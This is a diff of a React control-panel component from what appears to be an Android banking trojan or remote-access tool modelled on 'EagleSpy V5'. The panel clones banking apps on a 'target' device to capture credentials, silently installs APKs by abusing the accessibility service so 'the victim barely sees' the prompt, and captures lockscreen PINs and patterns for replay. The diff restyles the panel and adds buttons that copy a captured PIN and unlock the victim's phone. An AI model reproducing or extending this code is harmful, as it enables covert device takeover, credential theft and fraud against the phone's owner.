                   <h3 className="text-lg font-black text-white font-mono uppercase tracking-wide flex items-center gap-2">
-                    Duplicar App <span className="text-cyan-400">no Aparelho</span>
+                    Duplicar App <span className="text-[#ef4444]">no Aparelho</span>
                   </h3>
                   <p className="text-xs text-slate-400">Cria uma instncia duplicada do aplicativo no celular do alvo</p>
                 </div>
               </div>
               <button
                 onClick={() => setShowDeviceDuplicatorModal(false)}
-                className="text-slate-400 hover:text-white text-xl font-bold p-1 rounded-lg hover:bg-slate-800"
+                className="text-slate-400 hover:text-white text-xl font-bold p-1 rounded-md hover:bg-[#24242a]"
               >
-                ✕
+                
               </button>
             </div>
 
@@ -10932,7 +10996,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     setDuplicatorCloneName(`${name} (Duplicado)`);
                     setDuplicatorClonePackage(`${pkg}.cloned`);
                   }}
-                  className="w-full bg-[#190503] border border-blue-500/30 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-cyan-400 font-mono"
+                  className="w-full bg-[#190503] border border-[#2a2a31]/30 rounded-md px-4 py-3 text-white focus:outline-none focus:border-[#3a3a44] font-mono"
                 >
                   {installedApps.length > 0 ? (
                     installedApps.map((a, i) => (
@@ -10965,8 +11029,8 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   type="text"
                   value={duplicatorCloneName}
                   onChange={(e) => setDuplicatorCloneName(e.target.value)}
-                  placeholder="Ex: WhatsApp Dual,🏦 Itaú (Cópia)"
-                  className="w-full bg-[#190503] border border-blue-500/30 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-cyan-400"
+                  placeholder="Ex: WhatsApp Dual, Itaú (Cópia)"
+                  className="w-full bg-[#190503] border border-[#2a2a31]/30 rounded-md px-4 py-3 text-white focus:outline-none focus:border-[#3a3a44]"
                 />
               </div>
 
@@ -10980,12 +11044,12 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   value={duplicatorClonePackage}
                   onChange={(e) => setDuplicatorClonePackage(e.target.value)}
                   placeholder="Ex: com.whatsapp.cloned"
-                  className="w-full bg-[#190503] border border-blue-500/30 rounded-xl px-4 py-3 text-cyan-300 focus:outline-none focus:border-cyan-400"
+                  className="w-full bg-[#190503] border border-[#2a2a31]/30 rounded-md px-4 py-3 text-[#ef4444] focus:outline-none focus:border-[#3a3a44]"
                 />
               </div>
 
-              <div className="bg-[#190503] border border-cyan-500/20 rounded-xl p-3 text-[11px] text-slate-400 leading-relaxed">
-                💡 <span className="font-bold text-white">Injeção Automática:</span> Ao disparar este comando, o dispositivo alvo criará uma instncia duplicada do aplicativo selecionado vinculando os gatilhos de acessibilidade e captura de credenciais.
+              <div className="bg-[#190503] border border-[#2a2a31]/20 rounded-md p-3 text-[11px] text-slate-400 leading-relaxed">
+                 <span className="font-bold text-white">Injeção Automática:</span> Ao disparar este comando, o dispositivo alvo criará uma instncia duplicada do aplicativo selecionado vinculando os gatilhos de acessibilidade e captura de credenciais.
               </div>
             </div>
 
@@ -10994,14 +11058,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               <button
                 type="button"
                 onClick={() => setShowDeviceDuplicatorModal(false)}
-                className="flex-1 py-3 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 font-mono font-bold text-xs uppercase"
+                className="flex-1 py-3 rounded-md bg-[#24242a] hover:bg-[#2a2a31] text-slate-300 font-mono font-bold text-xs uppercase"
               >
                 Cancelar
               </button>
               <button
                 type="button"
                 onClick={handleDuplicateAppOnDevice}
-                className="flex-1 py-3 rounded-xl bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-white font-mono font-black text-xs uppercase tracking-wider shadow-[0_0_20px_rgba(255,43,43,0.3)] flex items-center justify-center gap-2"
+                className="flex-1 py-3 rounded-md bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#f87171] hover:to-[#ef4444] text-[#10120a] font-mono font-black text-xs uppercase tracking-wider shadow-[0_0_20px_rgba(239,68,68,0.3)] flex items-center justify-center gap-2"
               >
                 <Copy size={14} />
                 Duplicar no Aparelho
@@ -11011,11 +11075,11 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         </div>
       )}
 
-      {/* 🔧 MODAL CONFIRMAR CONFIGURAR ROM */}
+      {/*  MODAL CONFIRMAR CONFIGURAR ROM */}
       {showConfigureRomConfirm && (
         <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50" onClick={() => setShowConfigureRomConfirm(false)}>
-          <div className="bg-[#440e05] rounded-lg p-6 max-w-sm w-full mx-4" onClick={(e) => e.stopPropagation()}>
-            <h2 className="text-lg font-bold text-white mb-3">🔧 Configurar ROM</h2>
+          <div className="bg-[#121214] rounded-md p-6 max-w-sm w-full mx-4" onClick={(e) => e.stopPropagation()}>
+            <h2 className="text-lg font-bold text-white mb-3"> Configurar ROM</h2>
             <p className="text-gray-300 text-sm mb-4">
               Executar autostart + otimização de bateria automaticamente no dispositivo?
             </p>
@@ -11023,7 +11087,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               <button
                 type="button"
                 onClick={() => setShowConfigureRomConfirm(false)}
-                className="flex-1 py-2 bg-slate-600 hover:bg-slate-500 text-white rounded-lg font-semibold"
+                className="flex-1 py-2 bg-[#6f6f78] hover:bg-[#8b8b94] text-white rounded-md font-semibold"
               >
                 Cancelar
               </button>
@@ -11032,9 +11096,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 onClick={async () => {
                   setShowConfigureRomConfirm(false);
                   await sendCommand({ action: 'CONFIGURE_ROM' });
-                  addLog('🔧 Configurando ROM (Autostart, Battery...)');
+                  addLog(' Configurando ROM (Autostart, Battery...)');
                 }}
-                className="flex-1 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg font-semibold"
+                className="flex-1 py-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md font-semibold"
               >
                 Confirmar
               </button>
@@ -11043,13 +11107,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         </div>
       )}
 
-      {/* 📦 MODAL DE INSTALAR APK */}
+      {/*  MODAL DE INSTALAR APK */}
       {showInstallApkModal && (
         <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50" onClick={() => setShowInstallApkModal(false)}>
-          <div className="bg-[#440e05] rounded-lg p-6 max-w-md w-full mx-4" onClick={(e) => e.stopPropagation()}>
+          <div className="bg-[#121214] rounded-md p-6 max-w-md w-full mx-4" onClick={(e) => e.stopPropagation()}>
             <div className="flex items-center justify-between mb-4">
               <h2 className="text-xl font-bold text-white flex items-center">
-                <span className="text-2xl mr-3">📦</span>
+                <span className="text-2xl mr-3"></span>
                 Instalar APK Silenciosamente
               </h2>
               <button
@@ -11065,9 +11129,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
             
             <div className="space-y-4">
               <div className="text-sm text-gray-400 mb-4">
-                <p>📌 O APK será instalado automaticamente no dispositivo.</p>
-                <p>📌 O AccessibilityService vai auto-clicar em "Instalar".</p>
-                <p>📌 A vítima mal verá a tela de instalação!</p>
+                <p> O APK será instalado automaticamente no dispositivo.</p>
+                <p> O AccessibilityService vai auto-clicar em "Instalar".</p>
+                <p> A vítima mal verá a tela de instalação!</p>
               </div>
               
               {/* Input de arquivo oculto */}
@@ -11085,15 +11149,15 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               {/* rea de seleção de arquivo */}
               <div 
                 onClick={() => apkInputRef.current?.click()}
-                className={`border-2 border-dashed rounded-lg p-6 text-center cursor-pointer transition-all ${
+                className={`border-2 border-dashed rounded-md p-6 text-center cursor-pointer transition-all ${
                   selectedApkFile 
                     ? 'border-green-500 bg-green-500/10' 
-                    : 'border-blue-500/25 hover:border-orange-500 hover:bg-slate-700'
+                    : 'border-[#2a2a31]/25 hover:border-[#ef4444] hover:bg-[#2a2a31]'
                 }`}
               >
                 {selectedApkFile ? (
                   <div className="text-green-400">
-                    <span className="text-3xl">✅</span>
+                    <span className="text-3xl"></span>
                     <p className="mt-2 font-medium">{selectedApkFile.name}</p>
                     <p className="text-sm text-gray-400">
                       {(selectedApkFile.size / 1024 / 1024).toFixed(2)} MB
@@ -11101,7 +11165,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   </div>
                 ) : (
                   <div className="text-gray-400">
-                    <span className="text-3xl">“</span>
+                    <span className="text-3xl"></span>
                     <p className="mt-2">Clique para selecionar o arquivo .apk</p>
                     <p className="text-sm">ou arraste e solte aqui</p>
                   </div>
@@ -11115,17 +11179,17 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     setShowInstallApkModal(false);
                     setSelectedApkFile(null);
                   }}
-                  className="flex-1 py-3 bg-slate-700 hover:bg-slate-600 text-white rounded-lg font-semibold transition-all"
+                  className="flex-1 py-3 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded-md font-semibold transition-all"
                 >
                   Cancelar
                 </button>
                 <button
                   onClick={handleInstallApk}
                   disabled={!selectedApkFile || isInstallingApk}
-                  className={`flex-1 py-3 rounded-lg font-semibold transition-all flex items-center justify-center ${
+                  className={`flex-1 py-3 rounded-md font-semibold transition-all flex items-center justify-center ${
                     selectedApkFile && !isInstallingApk
-                      ? 'bg-orange-600 hover:bg-orange-700 text-white'
-                      : 'bg-slate-600 text-gray-400 cursor-not-allowed'
+                      ? 'bg-[#84cc16] hover:bg-orange-700 text-white'
+                      : 'bg-[#6f6f78] text-gray-400 cursor-not-allowed'
                   }`}
                 >
                   {isInstallingApk ? (
@@ -11134,7 +11198,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                       Enviando...
                     </>
                   ) : (
-                    '📦 Instalar'
+                    ' Instalar'
                   )}
                 </button>
               </div>
@@ -11143,20 +11207,20 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         </div>
       )}
 
-      {/* 🔒 MODAL DE LOCKSCREEN PIN + PATTERN - Igual EAGLESPY V5 */}
+      {/*  MODAL DE LOCKSCREEN PIN + PATTERN - Igual EAGLESPY V5 */}
       {showLockscreenModal && (
         <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 animate-fade-in" onClick={() => setShowLockscreenModal(false)}>
-          <div className="bg-gradient-to-br from-slate-950 via-slate-900 to-slate-950 rounded-2xl p-6 max-w-4xl w-full mx-4 border border-yellow-500/30 shadow-[0_0_50px_rgba(234,179,8,0.15)] max-h-[90vh] overflow-y-auto transition-all duration-300" onClick={(e) => e.stopPropagation()}>
+          <div className="bg-gradient-to-br from-slate-950 via-[#121214] to-slate-950 rounded-md p-6 max-w-4xl w-full mx-4 border border-yellow-500/30 shadow-[0_0_50px_rgba(234,179,8,0.15)] max-h-[90vh] overflow-y-auto transition-all duration-300" onClick={(e) => e.stopPropagation()}>
             
             {/* Header */}
-            <div className="flex items-center justify-between mb-6 border-b border-slate-800 pb-4">
+            <div className="flex items-center justify-between mb-6 border-b border-[#24242a] pb-4">
               <h2 className="text-xl font-extrabold text-white flex items-center gap-3">
-                <span className="text-2xl text-yellow-500 animate-pulse">🔒</span>
+                <span className="text-2xl text-yellow-500 animate-pulse"></span>
                 Lockscreen Controller & Visualizer
               </h2>
               <button
                 onClick={() => setShowLockscreenModal(false)}
-                className="text-gray-400 hover:text-white text-2xl transition-colors w-8 h-8 flex items-center justify-center rounded-full hover:bg-slate-800"
+                className="text-gray-400 hover:text-white text-2xl transition-colors w-8 h-8 flex items-center justify-center rounded-full hover:bg-[#24242a]"
               >
                 ×
               </button>
@@ -11168,34 +11232,34 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               <div className="md:col-span-7 space-y-6">
                 
                 {/* Seletor de Tipo */}
-                <div className="flex gap-2 p-1 bg-slate-950/60 rounded-xl border border-slate-800">
+                <div className="flex gap-2 p-1 bg-slate-950/60 rounded-md border border-[#24242a]">
                   <button
                     onClick={() => setLockscreenType('PIN')}
-                    className={`flex-1 py-2.5 rounded-lg font-bold text-xs uppercase tracking-wider transition-all ${
+                    className={`flex-1 py-2.5 rounded-md font-bold text-xs uppercase tracking-wider transition-all ${
                       lockscreenType === 'PIN'
-                        ? 'bg-gradient-to-r from-yellow-500 to-orange-500 text-black shadow-lg shadow-yellow-500/20'
-                        : 'text-gray-400 hover:text-white hover:bg-slate-900/60'
+                        ? 'bg-gradient-to-r from-yellow-500 to-[#ef4444] text-black shadow-lg shadow-yellow-500/20'
+                        : 'text-gray-400 hover:text-white hover:bg-[#121214]/60'
                     }`}
                   >
-                    🔢 PIN / Senha
+                     PIN / Senha
                   </button>
                   <button
                     onClick={() => setLockscreenType('PATTERN')}
-                    className={`flex-1 py-2.5 rounded-lg font-bold text-xs uppercase tracking-wider transition-all ${
+                    className={`flex-1 py-2.5 rounded-md font-bold text-xs uppercase tracking-wider transition-all ${
                       lockscreenType === 'PATTERN'
-                        ? 'bg-gradient-to-r from-blue-600 to-indigo-650 text-white shadow-lg shadow-blue-500/20'
-                        : 'text-gray-400 hover:text-white hover:bg-slate-900/60'
+                        ? 'bg-gradient-to-r from-[#ef4444] to-[#ef4444] text-[#10120a] shadow-lg shadow-[#ef4444]/20'
+                        : 'text-gray-400 hover:text-white hover:bg-[#121214]/60'
                     }`}
                   >
-                    🔲 Padrão (Swipe)
+                     Padrão (Swipe)
                   </button>
                 </div>
                 
                 {/* Status do Lockscreen */}
-                <div className={`p-4 rounded-xl border transition-all ${
+                <div className={`p-4 rounded-md border transition-all ${
                   isLockscreenActive 
                     ? 'bg-green-500/5 border-green-500/30' 
-                    : 'bg-slate-900/40 border-slate-800'
+                    : 'bg-[#121214]/40 border-[#24242a]'
                 }`}>
                   <div className="flex items-center justify-between">
                     <div>
@@ -11211,13 +11275,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                     </div>
                     <button
                       onClick={isLockscreenActive ? hideLockscreen : showLockscreen}
-                      className={`px-4 py-2 rounded-xl text-xs font-bold uppercase tracking-wider transition-all shadow-md ${
+                      className={`px-4 py-2 rounded-md text-xs font-bold uppercase tracking-wider transition-all shadow-md ${
                         isLockscreenActive
-                          ? 'bg-red-650/20 hover:bg-red-600/30 border border-red-500/30 text-red-400 hover:text-red-300'
+                          ? 'bg-red-650/20 hover:bg-[#ef4444]/30 border border-[#2a2a31]/30 text-[#ef4444] hover:text-[#ef4444]'
                           : 'bg-green-650/20 hover:bg-green-600/30 border border-green-500/30 text-green-400 hover:text-green-300'
                       }`}
                     >
-                      {isLockscreenActive ? ' Desativar' : `”’ Bloquear Device`}
+                      {isLockscreenActive ? ' Desativar' : ` Bloquear Device`}
                     </button>
                   </div>
                 </div>
@@ -11225,34 +11289,49 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 {/* Dados Capturados / Input */}
                 {lockscreenType === 'PIN' ? (
                   <div className="space-y-2">
-                    <label className="text-gray-400 text-xs font-bold uppercase tracking-wider">🔢 PIN Capturado/Salvo:</label>
+                    <label className="text-gray-400 text-xs font-bold uppercase tracking-wider"> PIN Capturado/Salvo:</label>
                     <div className="flex gap-2">
                       <input
                         type="text"
                         value={pinInput}
                         onChange={(e) => setPinInput(e.target.value.replace(/\D/g, ''))}
-                        placeholder="Digite ou edite o PIN"
+                        placeholder="PIN del equipo"
                         maxLength={10}
-                        className="flex-1 px-4 py-2.5 bg-slate-950 border border-yellow-500/20 rounded-xl text-center text-xl font-bold tracking-widest text-yellow-400 focus:border-yellow-500/50 focus:outline-none"
+                        className="flex-1 px-4 py-2.5 bg-slate-950 border border-yellow-500/20 rounded-md text-center text-xl font-bold tracking-widest text-yellow-400 focus:border-yellow-500/50 focus:outline-none"
                       />
                       <button
                         onClick={() => saveDevicePin(pinInput)}
-                        className="px-4 py-2.5 bg-yellow-600 hover:bg-yellow-500 text-black rounded-xl font-bold transition-all shadow-md shadow-yellow-500/10 flex items-center justify-center"
+                        className="px-4 py-2.5 bg-yellow-600 hover:bg-yellow-500 text-black rounded-md font-bold transition-all shadow-md shadow-yellow-500/10 flex items-center justify-center"
                         title="Salvar PIN no Servidor"
                       >
-                        💾
+                        
                       </button>
                     </div>
+                    <div className="flex gap-2">
+                      <button
+                        type="button"
+                        onClick={() => { const v = pinInput || capturedPin; if (v) { navigator.clipboard.writeText(v); addLog('PIN copiado'); } }}
+                        className="flex-1 py-2 rounded-md text-[11px] font-semibold border border-[#2a2a31] bg-[#16161a] text-[#9a9aa2] hover:text-[#e6e6e8] hover:bg-[#1c1c21] transition-colors"
+                      >
+                        Copiar PIN
+                      </button>
+                      <button
+                        type="button"
+                        onClick={playPinNow}
+                        className="flex-1 py-2 rounded-md text-[11px] font-semibold bg-[#ef4444] hover:bg-[#f87171] text-white transition-colors"
+                      >
+                        Desbloquear ahora
+                      </button>                    </div>
                     {capturedPin && capturedPin !== pinInput && (
-                      <div className="flex items-center gap-1.5 text-xs text-green-400 bg-green-950/20 border border-green-500/20 rounded-lg p-2">
-                        <span>💡</span>
-                        <span>Último PIN capturado pelo overlay: <strong className="font-mono text-sm">{capturedPin}</strong></span>
+                      <div className="flex items-center gap-1.5 text-xs text-green-400 bg-green-950/20 border border-green-500/20 rounded-md p-2">
+                        <span></span>
+                        <span>PIN capturado: <strong className="font-mono text-sm">{capturedPin}</strong></span>
                       </div>
                     )}
                   </div>
                 ) : (
                   <div className="space-y-2">
-                    <label className="text-gray-400 text-xs font-bold uppercase tracking-wider">🔲 Padrão Capturado/Salvo:</label>
+                    <label className="text-gray-400 text-xs font-bold uppercase tracking-wider"> Padrão Capturado/Salvo:</label>
                     <div className="flex gap-2">
                       <input
                         type="text"
@@ -11260,19 +11339,19 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                         onChange={(e) => setPatternInput(e.target.value.replace(/[^1-9]/g, ''))}
                         placeholder="Ex: 14789 (pontos 1-9)"
                         maxLength={9}
-                        className="flex-1 px-4 py-2.5 bg-slate-950 border border-blue-500/20 rounded-xl text-center text-xl font-bold tracking-widest text-blue-400 focus:border-blue-500/50 focus:outline-none"
+                        className="flex-1 px-4 py-2.5 bg-slate-950 border border-[#2a2a31]/20 rounded-md text-center text-xl font-bold tracking-widest text-[#ef4444] focus:border-[#2a2a31]/50 focus:outline-none"
                       />
                       <button
                         onClick={() => saveDevicePattern(patternInput)}
-                        className="px-4 py-2.5 bg-blue-600 hover:bg-blue-500 text-white rounded-xl font-bold transition-all shadow-md shadow-blue-500/10 flex items-center justify-center"
+                        className="px-4 py-2.5 bg-[#ef4444] hover:bg-[#ef4444] text-white rounded-md font-bold transition-all shadow-md shadow-[#ef4444]/10 flex items-center justify-center"
                         title="Salvar Padrão no Servidor"
                       >
-                        💾
+                        
                       </button>
                     </div>
                     {capturedPattern && capturedPattern !== patternInput && (
-                      <div className="flex items-center gap-1.5 text-xs text-green-400 bg-green-950/20 border border-green-500/20 rounded-lg p-2">
-                        <span>💡</span>
+                      <div className="flex items-center gap-1.5 text-xs text-green-400 bg-green-950/20 border border-green-500/20 rounded-md p-2">
+                        <span></span>
                         <span>Último Padrão capturado: <strong className="font-mono text-sm">{capturedPattern}</strong></span>
                       </div>
                     )}
@@ -11280,8 +11359,8 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 )}
                 
                 {/* Eventos capturados da lockscreen */}
-                <div className="p-4 rounded-xl border border-slate-800 bg-slate-900/10">
-                  <h3 className="text-xs font-bold text-gray-400 uppercase tracking-wider mb-3">📋 Histórico de Capturas de Lockscreen</h3>
+                <div className="p-4 rounded-md border border-[#24242a] bg-[#121214]/10">
+                  <h3 className="text-xs font-bold text-gray-400 uppercase tracking-wider mb-3"> Histórico de Capturas de Lockscreen</h3>
                   {renderCapturedUnlockPinsList()}
                 </div>
 
@@ -11289,44 +11368,44 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 
                 {/* Teclado Numérico para PIN (só aparece quando PIN) */}
                 {lockscreenType === 'PIN' && (
-                  <div className="bg-slate-950/80 rounded-xl p-4 border border-slate-800">
+                  <div className="bg-slate-950/80 rounded-md p-4 border border-[#24242a]">
                     <p className="text-[10px] text-gray-500 mb-3 text-center uppercase tracking-wider">Simular Digitação (Reprodução Manual no Aparelho)</p>
                     <div className="grid grid-cols-3 gap-2 max-w-[280px] mx-auto">
                       {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) => (
                         <button
                           key={num}
                           onClick={() => pressLockKey(num.toString())}
-                          className="py-2.5 bg-slate-900/60 hover:bg-yellow-500 hover:text-black text-white text-md font-bold rounded-xl transition-all border border-slate-800 hover:border-yellow-400 shadow-sm"
+                          className="py-2.5 bg-[#121214]/60 hover:bg-yellow-500 hover:text-black text-white text-md font-bold rounded-md transition-all border border-[#24242a] hover:border-yellow-400 shadow-sm"
                         >
                           {num}
                         </button>
                       ))}
                       <button
                         onClick={() => pressLockKey('DELETE')}
-                        className="py-2.5 bg-red-950/20 hover:bg-red-800 text-red-400 hover:text-white text-md font-bold rounded-xl transition-all border border-red-900/40"
+                        className="py-2.5 bg-[#121214]/20 hover:bg-[#24242a] text-[#ef4444] hover:text-white text-md font-bold rounded-md transition-all border border-[#1a1a1e]/40"
                       >
-                        ⌫
+                        
                       </button>
                       <button
                         onClick={() => pressLockKey('0')}
-                        className="py-2.5 bg-slate-900/60 hover:bg-yellow-500 hover:text-black text-white text-md font-bold rounded-xl transition-all border border-slate-800 hover:border-yellow-400 shadow-sm"
+                        className="py-2.5 bg-[#121214]/60 hover:bg-yellow-500 hover:text-black text-white text-md font-bold rounded-md transition-all border border-[#24242a] hover:border-yellow-400 shadow-sm"
                       >
                         0
                       </button>
                       <button
                         onClick={() => pressLockKey('ENTER')}
-                        className="py-2.5 bg-green-950/20 hover:bg-green-800 text-green-400 hover:text-white text-md font-bold rounded-xl transition-all border border-green-900/40"
+                        className="py-2.5 bg-green-950/20 hover:bg-green-800 text-green-400 hover:text-white text-md font-bold rounded-md transition-all border border-green-900/40"
                       >
-                        ✔
+                        
                       </button>
                     </div>
                   </div>
                 )}
                 
                 {/* Reprodução Automática */}
-                <div className={`rounded-xl p-4 border ${lockscreenType === 'PIN' ? 'bg-gradient-to-r from-yellow-950/20 to-orange-950/10 border-yellow-500/20' : 'bg-gradient-to-r from-blue-950/20 to-indigo-950/10 border-blue-500/20'}`}>
-                  <h3 className={`font-bold text-xs uppercase tracking-wider mb-3 flex items-center gap-1.5 ${lockscreenType === 'PIN' ? 'text-yellow-400' : 'text-blue-450'}`}>
-                    <span>🔄</span>
+                <div className={`rounded-md p-4 border ${lockscreenType === 'PIN' ? 'bg-gradient-to-r from-yellow-950/20 to-orange-950/10 border-yellow-500/20' : 'bg-gradient-to-r from-[#121214]/20 to-[#121214]/10 border-[#2a2a31]/20'}`}>
+                  <h3 className={`font-bold text-xs uppercase tracking-wider mb-3 flex items-center gap-1.5 ${lockscreenType === 'PIN' ? 'text-yellow-400' : 'text-[#ef4444]'}`}>
+                    <span></span>
                     Auto-Reprodução de Desbloqueio
                   </h3>
                   <div className="flex items-center gap-3 mb-3">
@@ -11338,7 +11417,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                       min={500}
                       max={5000}
                       step={100}
-                      className="w-24 px-2 py-1 bg-slate-950 border border-slate-800 rounded-lg text-white text-center font-mono text-xs focus:outline-none"
+                      className="w-24 px-2 py-1 bg-slate-950 border border-[#24242a] rounded-md text-white text-center font-mono text-xs focus:outline-none"
                     />
                     <span className="text-gray-500 text-[10px]">{lockscreenType === 'PIN' ? 'entre as teclas' : 'no início do gesto'}</span>
                   </div>
@@ -11350,12 +11429,12 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                       <button
                         onClick={playLockSequence}
                         disabled={isPlayingPin || !isPlayable}
-                        className={`w-full py-2.5 rounded-xl font-bold text-xs uppercase tracking-wider transition-all flex items-center justify-center gap-2 shadow-md ${
+                        className={`w-full py-2.5 rounded-md font-bold text-xs uppercase tracking-wider transition-all flex items-center justify-center gap-2 shadow-md ${
                           isPlayingPin
-                            ? `${lockscreenType === 'PIN' ? 'bg-yellow-500 text-black' : 'bg-blue-500 text-white'} cursor-not-allowed`
+                            ? `${lockscreenType === 'PIN' ? 'bg-yellow-500 text-black' : 'bg-[#ef4444] text-white'} cursor-not-allowed`
                             : isPlayable
-                              ? `bg-gradient-to-r ${lockscreenType === 'PIN' ? 'from-yellow-500 to-orange-500 hover:from-yellow-450 hover:to-orange-450 text-black' : 'from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white'}`
-                              : 'bg-slate-900 text-gray-500 cursor-not-allowed border border-slate-800'
+                              ? `bg-gradient-to-r ${lockscreenType === 'PIN' ? 'from-yellow-500 to-[#ef4444] hover:from-yellow-450 hover:to-orange-450 text-black' : 'from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a]'}`
+                              : 'bg-[#121214] text-gray-500 cursor-not-allowed border border-[#24242a]'
                         }`}
                       >
                         {isPlayingPin ? (
@@ -11364,9 +11443,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             Simulando Gestos no Device...
                           </>
                         ) : lockscreenType === 'PIN' ? (
-                          <>🔓 Reproduzir PIN no Aparelho</>
+                          <> Reproduzir PIN no Aparelho</>
                         ) : (
-                          <>🔓 Reproduzir Padrão no Aparelho</>
+                          <> Reproduzir Padrão no Aparelho</>
                         )}
                       </button>
                     );
@@ -11376,25 +11455,25 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               </div>
 
               {/* Coluna da Direita: Mockup do Celular Inovador (5/12) */}
-              <div className="md:col-span-5 flex flex-col items-center justify-center bg-[#190503]/60 border border-slate-800/80 rounded-2xl p-6 relative overflow-hidden shadow-inner min-h-[480px]">
+              <div className="md:col-span-5 flex flex-col items-center justify-center bg-[#190503]/60 border border-[#24242a]/80 rounded-md p-6 relative overflow-hidden shadow-inner min-h-[480px]">
                 {/* Background decorative grid/glow */}
                 <div className="absolute inset-0 bg-[radial-gradient(ellipse_80%_80%_at_50%_-20%,rgba(239,68,68,0.12),rgba(255,255,255,0))]" />
                 
                 {/* Smartphone Mockup */}
-                <div className="w-[230px] h-[450px] border-[5px] border-slate-800 bg-[#1a0703] rounded-[36px] relative shadow-[0_20px_50px_rgba(0,0,0,0.8),_0_0_20px_rgba(239,68,68,0.08)] p-3 flex flex-col justify-between overflow-hidden z-10">
+                <div className="w-[230px] h-[450px] border-[5px] border-[#24242a] bg-[#1a0703] rounded-[36px] relative shadow-[0_20px_50px_rgba(0,0,0,0.8),_0_0_20px_rgba(239,68,68,0.08)] p-3 flex flex-col justify-between overflow-hidden z-10">
                   {/* Phone Speaker Notch */}
-                  <div className="absolute top-2 left-1/2 -translate-x-1/2 w-16 h-3.5 bg-slate-800 rounded-full z-20 flex items-center justify-center">
-                    <div className="w-8 h-0.5 bg-slate-900 rounded-full" />
+                  <div className="absolute top-2 left-1/2 -translate-x-1/2 w-16 h-3.5 bg-[#24242a] rounded-full z-20 flex items-center justify-center">
+                    <div className="w-8 h-0.5 bg-[#121214] rounded-full" />
                   </div>
                   
                   {/* Screen Content */}
-                  <div className="w-full h-full rounded-[26px] bg-slate-950 border border-slate-900/60 p-2 flex flex-col overflow-hidden relative">
+                  <div className="w-full h-full rounded-[26px] bg-slate-950 border border-[#121214]/60 p-2 flex flex-col overflow-hidden relative">
                     {/* Simulated Status Bar */}
                     <div className="flex justify-between items-center text-[7px] text-gray-500 px-2 pt-1 font-mono">
                       <span>{new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
                       <div className="flex items-center gap-0.5 scale-90 origin-right">
-                        <span>📶</span>
-                        <span>🔋</span>
+                        <span></span>
+                        <span></span>
                       </div>
                     </div>
                     
@@ -11405,10 +11484,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 <div className="mt-4 text-center z-10">
                   <span className={`inline-flex items-center px-2.5 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider ${
                     isLockscreenActive 
-                      ? 'bg-red-950/60 text-red-400 border border-red-500/20' 
+                      ? 'bg-[#121214]/60 text-[#ef4444] border border-[#2a2a31]/20' 
                       : 'bg-green-950/60 text-green-400 border border-green-500/20'
                   }`}>
-                    <span className={`w-2.5 h-2.5 rounded-full mr-1.5 ${isLockscreenActive ? 'bg-red-500 animate-pulse' : 'bg-green-500'}`} />
+                    <span className={`w-2.5 h-2.5 rounded-full mr-1.5 ${isLockscreenActive ? 'bg-[#ef4444] animate-pulse' : 'bg-green-500'}`} />
                     {isLockscreenActive ? 'Tela Bloqueada' : 'Device Livre'}
                   </span>
                 </div>
@@ -11416,14 +11495,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               
             </div>
             
-            <p className="text-center text-[10px] text-gray-650 mt-6 border-t border-slate-800/60 pt-4">
-              🔒 Lockscreen Module — Sincronização e Decodificação de PIN + Padrão (V5 System)
+            <p className="text-center text-[10px] text-gray-650 mt-6 border-t border-[#24242a]/60 pt-4">
+               Lockscreen Module  Sincronização e Decodificação de PIN + Padrão (V5 System)
             </p>
           </div>
         </div>
       )}
       
-      {/* 🎨 Layout Edit Mode - Toolbar e Botão Flutuante */}
+      {/*  Layout Edit Mode - Toolbar e Botão Flutuante */}
       <EditModeToggle 
         isEditMode={isLayoutEditMode} 
         onToggle={() => setIsLayoutEditMode(true)} 
@@ -11437,7 +11516,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         onReset={resetLayoutPrefs}
       />
       
-      {/* 🎨 Editor de Tela Preta Customizada */}
+      {/*  Editor de Tela Preta Customizada */}
       <BlackScreenEditor
         isOpen={showBlackScreenEditor}
         onClose={() => setShowBlackScreenEditor(false)}
@@ -11457,7 +11536,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
